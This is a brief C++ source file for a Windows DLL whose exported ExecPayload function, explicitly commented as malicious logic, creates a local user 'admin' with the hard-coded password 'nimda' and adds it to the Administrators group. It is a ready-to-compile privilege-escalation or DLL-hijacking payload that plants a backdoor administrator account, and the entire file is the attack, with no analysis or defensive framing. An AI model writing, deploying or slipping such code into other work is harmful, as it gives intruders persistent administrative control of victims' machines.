#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

extern "C" __declspec(dllexport) void CALLBACK ExecPayload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    // Your malicious logic here — create user
    USER_INFO_1 ui;
    LPCWSTR username = L"admin";
    LPCWSTR password = L"nimda";

    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;

    DWORD dwError = 0;
    NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);

    // Add to Administrators
    LOCALGROUP_MEMBERS_INFO_3 group;
    group.lgrmi3_domainandname = (LPWSTR)username;
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&group, 1);
}
